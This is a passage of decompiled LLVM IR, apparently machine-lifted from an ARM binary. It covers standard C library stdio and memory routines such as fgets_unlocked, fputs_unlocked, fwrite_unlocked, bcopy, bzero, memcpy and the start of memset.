  %v9_d334106 = icmp eq i32 %v2_d33098, %v3_d324
  br i1 %v9_d334106, label %dec_label_pc_d33c, label %dec_label_pc_d354

dec_label_pc_d33c:                                ; preds = %dec_label_pc_d324, %dec_label_pc_d33c.dec_label_pc_d330_crit_edge
  %v0_d33c107 = phi i32 [ %v1_d334.pre, %dec_label_pc_d33c.dec_label_pc_d330_crit_edge ], [ %v3_d324, %dec_label_pc_d324 ]
  store i32 %v0_d33c107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_d34c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_d34c, label %dec_label_pc_d350, label %dec_label_pc_d33c.dec_label_pc_d330_crit_edge

dec_label_pc_d33c.dec_label_pc_d330_crit_edge:    ; preds = %dec_label_pc_d33c
  %v0_d330.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_d334.pre = load i32, i32* @r4, align 4
  %v1_d330 = inttoptr i32 %v0_d330.pre to i32*
  %v2_d330 = load i32, i32* %v1_d330, align 4
  store i32 %v2_d330, i32* %r3.global-to-local, align 4
  %v3_d334 = icmp uge i32 %v2_d330, %v1_d334.pre
  store i1 %v3_d334, i1* %cpsr_c.global-to-local, align 1
  %v9_d334 = icmp eq i32 %v2_d330, %v1_d334.pre
  br i1 %v9_d334, label %dec_label_pc_d33c, label %dec_label_pc_d354

dec_label_pc_d350:                                ; preds = %dec_label_pc_d33c
  %v0_d350 = load i32, i32* @r4, align 4
  store i32 %v0_d350, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d354

dec_label_pc_d354:                                ; preds = %dec_label_pc_d324, %dec_label_pc_d33c.dec_label_pc_d330_crit_edge, %dec_label_pc_d350
  %v0_d35c = phi i32 [ %v0_d350, %dec_label_pc_d350 ], [ %v2_d33098, %dec_label_pc_d324 ], [ %v2_d330, %dec_label_pc_d33c.dec_label_pc_d330_crit_edge ]
  %v1_d354 = phi i32 [ %v0_d350, %dec_label_pc_d350 ], [ %v3_d324, %dec_label_pc_d324 ], [ %v1_d334.pre, %dec_label_pc_d33c.dec_label_pc_d330_crit_edge ]
  %v3_d354 = icmp uge i32 %v0_d35c, %v1_d354
  store i1 %v3_d354, i1* %cpsr_c.global-to-local, align 1
  %v9_d354 = icmp eq i32 %v0_d35c, %v1_d354
  br i1 %v9_d354, label %dec_label_pc_d35c, label %dec_label_pc_d354.dec_label_pc_d324_crit_edge

dec_label_pc_d354.dec_label_pc_d324_crit_edge:    ; preds = %dec_label_pc_d354
  %v0_d324.pre = load i32, i32* @r5, align 4
  %v0_d32c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d324

dec_label_pc_d35c:                                ; preds = %dec_label_pc_d354
  %v2_d35c = icmp ne i32 %v1_d354, 0
  store i1 %v2_d35c, i1* %cpsr_c.global-to-local, align 1
  %v7_d360 = icmp slt i32 %v1_d354, 2
  br i1 %v7_d360, label %dec_label_pc_d37c, label %dec_label_pc_d364

dec_label_pc_d364:                                ; preds = %dec_label_pc_d35c
  %v0_d364 = load i32, i32* @r5, align 4
  %v1_d364 = add i32 %v0_d364, 56
  store i32 %v1_d364, i32* %r0.global-to-local, align 4
  %v0_d368 = load i32, i32* %r1.global-to-local, align 4
  %v1_d368 = add i32 %v0_d368, 129
  store i32 %v1_d368, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d308, %dec_label_pc_d364, %dec_label_pc_d35c, %bb71, %dec_label_pc_d244
  %v0_d37c = load i32, i32* @r5, align 4
  %v1_d37c = add i32 %v0_d37c, 32
  %v2_d37c = inttoptr i32 %v1_d37c to i32*
  %v3_d37c = load i32, i32* %v2_d37c, align 4
  store i32 %v3_d37c, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d380 = icmp eq i32 %v3_d37c, 0
  br i1 %v2_d380, label %dec_label_pc_d388, label %dec_label_pc_d244

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d234
  %v0_d388 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_d388, i32* %r0.global-to-local, align 4
  %v0_d3c4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_d390:                                ; preds = %dec_label_pc_d06c
  %v3_d390 = load i16, i16* %arg1, align 2
  %v4_d390 = zext i16 %v3_d390 to i32
  %v1_d394 = and i32 %v4_d390, 64
  store i32 %v1_d394, i32* %r3.global-to-local, align 4
  %v2_d394 = icmp eq i32 %v1_d394, 0
  br i1 %v2_d394, label %bb72, label %dec_label_pc_d3a0

bb72:                                             ; preds = %dec_label_pc_d390
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d390
  %v0_d3a0 = call i32 @__stdio_wcommit()
  store i32 %v0_d3a0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d3a4 = icmp eq i32 %v0_d3a0, 0
  br i1 %v2_d3a4, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_d3a0
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_d3a0
  %v1_d3a8 = load i32, i32* @r4, align 4
  %v2_d3a8 = inttoptr i32 %v1_d3a8 to i16*
  %v3_d3a8 = load i16, i16* %v2_d3a8, align 2
  %v4_d3a8 = zext i16 %v3_d3a8 to i32
  store i32 %v4_d3a8, i32* %r3.global-to-local, align 4
  %v2_d3ac = add i32 %v1_d3a8, 8
  %v3_d3ac = inttoptr i32 %v2_d3ac to i32*
  %v4_d3ac = load i32, i32* %v3_d3ac, align 4
  store i32 %v4_d3ac, i32* %r2.global-to-local, align 4
  %v2_d3b0 = and i32 %v4_d3a8, 65471
  store i32 %v2_d3b0, i32* %r3.global-to-local, align 4
  %v2_d3b4 = trunc i32 %v2_d3b0 to i16
  store i16 %v2_d3b4, i16* %v2_d3a8, align 2
  %v1_d3b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_d3b8 = load i32, i32* @r4, align 4
  %v3_d3b8 = add i32 %v2_d3b8, 28
  %v4_d3b8 = inttoptr i32 %v3_d3b8 to i32*
  store i32 %v1_d3b8, i32* %v4_d3b8, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_d388, %.thread14
  %v0_d3c4 = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_d3c4.pre, %dec_label_pc_d388 ], [ 0, %.thread14 ]
  store i32 %v0_d3c4, i32* %r0.global-to-local, align 4
  store i32 %v6_d040, i32* %r5.global-to-local, align 4
  ret i32 %v0_d3c4

; uselistorder directives
  uselistorder i32 %v0_d3c4, { 1, 0 }
  uselistorder i32 %v3_d37c, { 1, 2, 0 }
  uselistorder i32 %v0_d350, { 1, 0, 2 }
  uselistorder i32 %v1_d334.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d29c, { 1, 0, 2 }
  uselistorder i32 %v1_d280.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d264, { 1, 0 }
  uselistorder i32 %v0_d208, { 1, 0, 2 }
  uselistorder i32 %v1_d1ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d1dc, { 1, 0 }
  uselistorder i32 %v0_d1a0, { 1, 0, 2 }
  uselistorder i32 %v1_d184.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d16c, { 1, 0 }
  uselistorder i32 %v0_d134, { 1, 0, 2 }
  uselistorder i32 %v1_d118.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_d108, { 1, 0 }
  uselistorder i32 %v0_d0c4, { 1, 0, 2 }
  uselistorder i32 %v1_d0a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_d080, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 10, 9, 55, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 3, 23, 24, 25, 26, 27, 28, 30, 29, 2, 31, 32, 33, 34, 36, 35, 54, 37, 38, 39, 40, 42, 41, 1, 43, 44, 45, 46, 48, 47, 0, 49, 50, 53, 51, 52 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 17, 5, 6, 8, 7, 2, 9, 10, 11, 12, 14, 13, 1, 15, 16, 0, 18, 19, 21, 20, 3, 22, 23, 24, 35, 36, 25, 26, 27, 28, 37, 38, 29, 30, 31, 39, 40, 32, 33, 34 }
  uselistorder i32 168, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 14, 12, 15, 13, 16, 17, 21, 18, 22, 19, 23, 20, 24 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_d37c, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_d354, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d33c, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d2bc, { 1, 0 }
  uselistorder label %dec_label_pc_d2b0, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_d2a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d288, { 1, 0 }
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %dec_label_pc_d234thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_d20c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d1f4, { 1, 0 }
  uselistorder label %dec_label_pc_d1b4, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_d1a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d18c, { 1, 0 }
  uselistorder label %dec_label_pc_d160, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d138, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d120, { 1, 0 }
  uselistorder label %dec_label_pc_d0d8, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_d0c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d0b0, { 1, 0 }
  uselistorder label %dec_label_pc_d07c, { 1, 0 }
}

define i32 @function_d3d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_d3d8:
  %v0_d3d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d3d8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_d3d8
  %v2_d3d8 = load i32, i32* @r4, align 4
  %v8_d3d8 = ashr i32 %v2_d3d8, %arg1
  %v9_d3d8 = and i32 %v8_d3d8, %arg1
  %v2_d3dc = load i32, i32* @r8, align 4
  %v5_d3dc = udiv i32 %v2_d3dc, 2
  %v6_d3dc = and i32 %v9_d3d8, %v5_d3dc
  %v2_d3e0 = load i32, i32* @ip, align 4
  %v3_d3e0 = and i32 %v6_d3dc, %v2_d3e0
  %v5_d3e4 = udiv i32 %v3_d3e0, 2
  %v6_d3e4 = and i32 %v3_d3e0, %v2_d3d8
  %v4_d3e8 = and i32 %v6_d3e4, %v5_d3e4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d3d8, %bb
  %v5_d3e8 = phi i32 [ %arg1, %dec_label_pc_d3d8 ], [ %v4_d3e8, %bb ]
  ret i32 %v5_d3e8

; uselistorder directives
  uselistorder i32 %v3_d3e0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_d3ec = load i32, i32* @r6, align 4
  %v12_d3ec = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_d3f0 = icmp eq i32 %arg2, 0
  store i1 %v2_d3f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_d478, label %dec_label_pc_d460.preheader

dec_label_pc_d460.preheader:                      ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_d4602 = add i32 %arg2, -1
  store i32 %v1_d4602, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_d4608 = icmp eq i32 %arg2, 1
  store i1 %v7_d4608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d4608, label %dec_label_pc_d468, label %dec_label_pc_d40c

dec_label_pc_d40c:                                ; preds = %dec_label_pc_d460.preheader, %dec_label_pc_d460.backedge.dec_label_pc_d40c_crit_edge
  %v0_d430 = phi i32 [ %v0_d40c.pre, %dec_label_pc_d460.backedge.dec_label_pc_d40c_crit_edge ], [ %arg3, %dec_label_pc_d460.preheader ]
  %v1_d40c = add i32 %v0_d430, 16
  %v2_d40c = inttoptr i32 %v1_d40c to i32*
  %v3_d40c = load i32, i32* %v2_d40c, align 4
  store i32 %v3_d40c, i32* %r2.global-to-local, align 4
  %v1_d410 = add i32 %v0_d430, 24
  %v2_d410 = inttoptr i32 %v1_d410 to i32*
  %v3_d410 = load i32, i32* %v2_d410, align 4
  store i32 %v3_d410, i32* %r3.global-to-local, align 4
  %v3_d414 = icmp uge i32 %v3_d40c, %v3_d410
  store i1 %v3_d414, i1* %cpsr_c.global-to-local, align 1
  %v9_d414 = icmp eq i32 %v3_d40c, %v3_d410
  store i1 %v9_d414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d414, label %dec_label_pc_d430, label %dec_label_pc_d41c

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d40c
  %v1_d41c = inttoptr i32 %v3_d40c to i8*
  %v2_d41c = load i8, i8* %v1_d41c, align 1
  %v3_d41c = zext i8 %v2_d41c to i32
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v5_d41c = add i32 %v3_d40c, 1
  store i32 %v5_d41c, i32* %r2.global-to-local, align 4
  %v2_d420 = load i32, i32* @r5, align 4
  %v3_d420 = inttoptr i32 %v2_d420 to i8*
  store i8 %v2_d41c, i8* %v3_d420, align 1
  %v4_d420 = load i32, i32* @r5, align 4
  %v5_d420 = add i32 %v4_d420, 1
  store i32 %v5_d420, i32* @r5, align 4
  %v0_d424 = load i32, i32* %r3.global-to-local, align 4
  %v2_d424 = icmp ugt i32 %v0_d424, 9
  store i1 %v2_d424, i1* %cpsr_c.global-to-local, align 1
  %v7_d424 = icmp eq i32 %v0_d424, 10
  store i1 %v7_d424, i1* %cpsr_z.global-to-local, align 1
  %v0_d428 = load i32, i32* %r2.global-to-local, align 4
  %v1_d428 = load i32, i32* @r4, align 4
  %v2_d428 = add i32 %v1_d428, 16
  %v3_d428 = inttoptr i32 %v2_d428 to i32*
  store i32 %v0_d428, i32* %v3_d428, align 4
  br i1 %v7_d424, label %dec_label_pc_d468, label %dec_label_pc_d460.backedge

dec_label_pc_d430:                                ; preds = %dec_label_pc_d40c
  %v1_d430 = inttoptr i32 %v0_d430 to i16*
  %v3_d434 = call i32 @getc_unlocked(i16* %v1_d430)
  %v3_d438 = icmp eq i32 %v3_d434, -1
  store i1 %v3_d438, i1* %cpsr_c.global-to-local, align 1
  %v8_d438 = icmp eq i32 %v3_d434, -1
  store i1 %v8_d438, i1* %cpsr_z.global-to-local, align 1
  %v1_d43c = urem i32 %v3_d434, 256
  store i32 %v1_d43c, i32* %r3.global-to-local, align 4
  br i1 %v3_d438, label %dec_label_pc_d444, label %dec_label_pc_d45c

dec_label_pc_d444:                                ; preds = %dec_label_pc_d430
  %v0_d444 = load i32, i32* @r4, align 4
  %v1_d444 = inttoptr i32 %v0_d444 to i16*
  %v2_d444 = load i16, i16* %v1_d444, align 2
  %v3_d444 = zext i16 %v2_d444 to i32
  store i32 %v3_d444, i32* %r3.global-to-local, align 4
  %v1_d448 = and i32 %v3_d444, 8
  %v2_d448 = icmp eq i32 %v1_d448, 0
  store i1 %v2_d448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d448, label %dec_label_pc_d468, label %dec_label_pc_d478

dec_label_pc_d45c:                                ; preds = %dec_label_pc_d430
  %v1_d454 = trunc i32 %v3_d434 to i8
  %v2_d454 = load i32, i32* @r5, align 4
  %v3_d454 = inttoptr i32 %v2_d454 to i8*
  store i8 %v1_d454, i8* %v3_d454, align 1
  %v4_d454 = load i32, i32* @r5, align 4
  %v5_d454 = add i32 %v4_d454, 1
  store i32 %v5_d454, i32* @r5, align 4
  %v0_d458 = load i32, i32* %r3.global-to-local, align 4
  %v2_d458 = icmp ugt i32 %v0_d458, 9
  store i1 %v2_d458, i1* %cpsr_c.global-to-local, align 1
  %v7_d458 = icmp eq i32 %v0_d458, 10
  store i1 %v7_d458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d458, label %dec_label_pc_d468, label %dec_label_pc_d460.backedge

dec_label_pc_d460.backedge:                       ; preds = %dec_label_pc_d45c, %dec_label_pc_d41c
  %v0_d460 = load i32, i32* @r6, align 4
  %v1_d460 = add i32 %v0_d460, -1
  store i32 %v1_d460, i32* @r6, align 4
  %v2_d460 = icmp ne i32 %v0_d460, 0
  store i1 %v2_d460, i1* %cpsr_c.global-to-local, align 1
  %v7_d460 = icmp eq i32 %v0_d460, 1
  store i1 %v7_d460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d460, label %dec_label_pc_d468, label %dec_label_pc_d460.backedge.dec_label_pc_d40c_crit_edge

dec_label_pc_d460.backedge.dec_label_pc_d40c_crit_edge: ; preds = %dec_label_pc_d460.backedge
  %v0_d40c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d40c

dec_label_pc_d468:                                ; preds = %dec_label_pc_d45c, %dec_label_pc_d460.backedge, %dec_label_pc_d41c, %dec_label_pc_d460.preheader, %dec_label_pc_d444
  %v0_d468 = load i32, i32* @r5, align 4
  %v1_d468 = load i32, i32* @r7, align 4
  %v3_d468 = icmp uge i32 %v0_d468, %v1_d468
  store i1 %v3_d468, i1* %cpsr_c.global-to-local, align 1
  %v9_d468 = icmp eq i32 %v0_d468, %v1_d468
  store i1 %v9_d468, i1* %cpsr_z.global-to-local, align 1
  %v2_d46c = xor i1 %v9_d468, true
  %v3_d46c = and i1 %v3_d468, %v2_d46c
  br i1 %v3_d46c, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_d468
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_d470 = inttoptr i32 %v0_d468 to i8*
  store i8 0, i8* %v7_d470, align 1
  %v0_d474.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_d474.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_d468, %bb
  %v1_d474 = phi i1 [ %v1_d474.pre, %bb ], [ %v9_d468, %dec_label_pc_d468 ]
  %v0_d474 = phi i1 [ %v0_d474.pre, %bb ], [ %v3_d468, %dec_label_pc_d468 ]
  %v2_d474 = xor i1 %v1_d474, true
  %v3_d474 = and i1 %v0_d474, %v2_d474
  br i1 %v3_d474, label %.dec_label_pc_d47c_crit_edge, label %dec_label_pc_d478

.dec_label_pc_d47c_crit_edge:                     ; preds = %.thread14
  %v0_d47c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d47c

dec_label_pc_d478:                                ; preds = %entry, %dec_label_pc_d444, %.thread14
  br label %dec_label_pc_d47c

dec_label_pc_d47c:                                ; preds = %.dec_label_pc_d47c_crit_edge, %dec_label_pc_d478
  %v0_d47c = phi i32 [ %v0_d47c.pre, %.dec_label_pc_d47c_crit_edge ], [ 0, %dec_label_pc_d478 ]
  store i32 %v9_d3ec, i32* @r6, align 4
  store i32 %v12_d3ec, i32* @r7, align 4
  ret i32 %v0_d47c

; uselistorder directives
  uselistorder i1 %v9_d468, { 1, 0, 2 }
  uselistorder i32 %v1_d468, { 1, 0 }
  uselistorder i32 %v0_d468, { 0, 2, 1 }
  uselistorder i32 %v0_d460, { 2, 0, 1 }
  uselistorder i32 %v0_d458, { 1, 0 }
  uselistorder i32 %v3_d434, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d424, { 1, 0 }
  uselistorder i32 %v3_d40c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_d430, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_d47c, { 1, 0 }
  uselistorder label %dec_label_pc_d478, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_d468, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_d40c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_d48c = load i32, i32* @r4, align 4
  store i32 %v3_d48c, i32* %stack_var_-16, align 4
  %v6_d48c = load i32, i32* @r5, align 4
  %v9_d48c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_d498 = call i32 @strlen(i8* %arg1)
  store i32 %v3_d498, i32* @r6, align 4
  %v0_d4a0 = load i32, i32* @r5, align 4
  %v0_d4a4 = load i32, i32* @r4, align 4
  %v5_d4b0 = inttoptr i32 %v0_d4a0 to i16*
  %v6_d4b0 = call i32 @__GI_fwrite_unlocked(i32 %v0_d4a4, i32 1, i32 %v3_d498, i16* %v5_d4b0)
  %v1_d4b4 = load i32, i32* @r6, align 4
  %v9_d4b4 = icmp eq i32 %v6_d4b0, %v1_d4b4
  br i1 %v9_d4b4, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_d4c0 = phi i32 [ %v6_d4b0, %entry ], [ -1, %bb ]
  %v2_d4bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d4bc, i32* @r4, align 4
  store i32 %v6_d48c, i32* @r5, align 4
  store i32 %v9_d48c, i32* @r6, align 4
  ret i32 %v1_d4c0

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg4 to i32
  %v9_d4c4 = load i32, i32* @r6, align 4
  %v12_d4c4 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_d4cc = load i16, i16* %arg4, align 2
  %v1_d4d0 = and i16 %v3_d4cc, 192
  %v2_d4d4 = icmp eq i16 %v1_d4d0, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_d4d4, label %dec_label_pc_d500, label %dec_label_pc_d4ec

dec_label_pc_d4ec:                                ; preds = %entry
  %v4_d4f4 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_d4f8 = icmp eq i32 %v4_d4f4, 0
  br i1 %v2_d4f8, label %dec_label_pc_d500thread-pre-split, label %dec_label_pc_d568

dec_label_pc_d500thread-pre-split:                ; preds = %dec_label_pc_d4ec
  %v0_d500.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_d500

dec_label_pc_d500:                                ; preds = %dec_label_pc_d500thread-pre-split, %entry
  %v0_d524 = phi i32 [ %v0_d500.pr, %dec_label_pc_d500thread-pre-split ], [ %arg2, %entry ]
  %v2_d500 = icmp eq i32 %v0_d524, 0
  br i1 %v2_d500, label %dec_label_pc_d568, label %bb

bb:                                               ; preds = %dec_label_pc_d500
  %v1_d504 = load i32, i32* @r6, align 4
  %v3_d504 = icmp eq i32 %v1_d504, 0
  br i1 %v3_d504, label %dec_label_pc_d568, label %dec_label_pc_d50c

dec_label_pc_d50c:                                ; preds = %bb
  %v2_d514 = udiv i32 -1, %v0_d524
  %tmp9 = icmp ugt i32 %v1_d504, %v2_d514
  %v0_d540 = load i32, i32* @r5, align 4
  %v1_d540 = inttoptr i32 %v0_d540 to i16*
  br i1 %tmp9, label %dec_label_pc_d540, label %dec_label_pc_d520

dec_label_pc_d520:                                ; preds = %dec_label_pc_d50c
  %v2_d524 = mul i32 %v1_d504, %v0_d524
  %v0_d528 = load i32, i32* @r7, align 4
  %v5_d52c = call i32 @__stdio_fwrite(i32 %v0_d528, i32 %v2_d524, i16* %v1_d540)
  %v0_d530 = load i32, i32* @r4, align 4
  %v2_d534 = udiv i32 %v5_d52c, %v0_d530
  store i32 %v2_d534, i32* @r1, align 4
  br label %dec_label_pc_d56c

dec_label_pc_d540:                                ; preds = %dec_label_pc_d50c
  %v2_d540 = load i16, i16* %v1_d540, align 2
  %v1_d544 = or i16 %v2_d540, 8
  store i16 %v1_d544, i16* %v1_d540, align 2
  %v0_d550 = call i32 @__aeabi_read_tp()
  %v3_d554 = load i16, i16* @global_var_24070.401, align 2
  %v4_d554 = sext i16 %v3_d554 to i32
  store i32 0, i32* @r1, align 4
  %v3_d560 = add i32 %v4_d554, %v0_d550
  %v4_d560 = inttoptr i32 %v3_d560 to i32*
  store i32 22, i32* %v4_d560, align 4
  %v0_d56c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_d56c

dec_label_pc_d568:                                ; preds = %dec_label_pc_d500, %dec_label_pc_d4ec, %bb
  store i32 0, i32* @r1, align 4
  br label %dec_label_pc_d56c

dec_label_pc_d56c:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d520, %dec_label_pc_d568
  %v0_d56c = phi i32 [ %v0_d56c.pre, %dec_label_pc_d540 ], [ %v2_d534, %dec_label_pc_d520 ], [ 0, %dec_label_pc_d568 ]
  store i32 %v9_d4c4, i32* @r6, align 4
  store i32 %v12_d4c4, i32* @r7, align 4
  ret i32 %v0_d56c

; uselistorder directives
  uselistorder i16* %v1_d540, { 0, 2, 1 }
  uselistorder i32 %v1_d504, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_d56c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d568, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_d58c = inttoptr i32 %arg2 to i8*
  %v3_d58c = call i32 @_memcpy(i8* %v2_d58c, i32 %arg1)
  ret i32 %v3_d58c
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_d598 = load i32, i32* @r0, align 4
  %v3_d598 = inttoptr i32 %v0_d598 to i8*
  %v4_d598 = call i32 @__GI_memset(i8* %v3_d598, i32 0, i32 %arg1)
  ret i32 %v4_d598
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_d5a0 = load i32, i32* @r0, align 4
  %v1_d5a0 = load i32, i32* @r1, align 4
  %v2_d5a0 = inttoptr i32 %v0_d5a0 to i8*
  %v3_d5a0 = call i32 @_memcpy(i8* %v2_d5a0, i32 %v1_d5a0)
  ret i32 %v3_d5a0
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_d5b4 = icmp eq i32 %arg3, 8
  store i1 %v8_d5b4, i1* %cpsr_z.global-to-local, align 1
  %v5_d5b8 = icmp slt i32 %arg3, 8
  br i1 %v5_d5b8, label %dec_label_pc_d618, label %dec_label_pc_d5bc

dec_label_pc_d5bc:                                ; preds = %entry
  %v4_d5bc = mul i32 %arg2, 256
  %v5_d5bc = or i32 %v4_d5bc, %arg2
  %v4_d5c0 = mul i32 %v5_d5bc, 65536
  %v5_d5c0 = or i32 %v4_d5c0, %v5_d5bc
  store i32 %v5_d5c0, i32* @r1, align 4
  %v1_d5c457 = urem i32 %tmp, 4
